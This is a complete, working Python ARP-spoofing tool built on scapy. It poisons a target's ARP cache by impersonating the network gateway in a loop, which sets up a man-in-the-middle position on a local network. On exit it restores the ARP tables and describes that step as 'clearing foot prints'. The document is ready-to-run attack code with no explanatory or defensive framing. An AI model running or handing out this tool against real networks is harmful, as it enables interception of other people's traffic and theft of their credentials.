import scapy.all as scapy
import time
import optparse

def arguments():
    parse = optparse.OptionParser()
    parse.add_option("-t", "--target", dest="target", help="Target IP / IP range.")
    parse.add_option("-g", "--gateway", dest="gateway", help="Gateway of the network your in.")
    (options, args) = parse.parse_args()
    return options

def mac(ip):
    request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    response = scapy.srp(request, timeout=1, verbose=False)[0]
    return response[0][1].hwsrc

def restore(dest_ip, src_ip):
    dest_mac = mac(dest_ip)
    src_mac = mac(src_ip)
    packet = scapy.ARP(op=2,pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


def spoof(target_ip, spoof_ip):
    targe_mac = mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=targe_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)

options = arguments()
target_ip = options.target
gateway_ip = options.gateway
try:
    p_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(target_ip, gateway_ip)
        p_count = p_count + 2
        print("\r[+]Sent " + str(p_count) + " packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-]Quitting Program........Clearing foot prints............")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)